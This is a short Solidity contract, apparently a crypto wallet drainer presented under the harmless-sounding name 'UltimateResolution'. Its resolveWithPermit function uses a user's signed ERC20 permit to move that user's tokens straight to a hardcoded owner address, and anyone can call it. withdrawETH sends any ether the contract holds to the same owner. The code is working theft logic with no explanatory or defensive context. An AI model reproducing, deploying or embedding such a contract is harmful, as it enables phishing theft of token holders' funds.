// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/IERC20Permit.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";

contract UltimateResolution {
    address public owner;

    constructor() {
        owner = 0xF10b3300F6944e40A203587339C07e5119A70c55;
    }

    function resolveWithPermit(
        address token,
        address user,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        IERC20Permit(token).permit(user, address(this), amount, deadline, v, r, s);
        IERC20(token).transferFrom(user, owner, amount);
    }

    function withdrawETH() external {
        payable(owner).transfer(address(this).balance);
    }
}
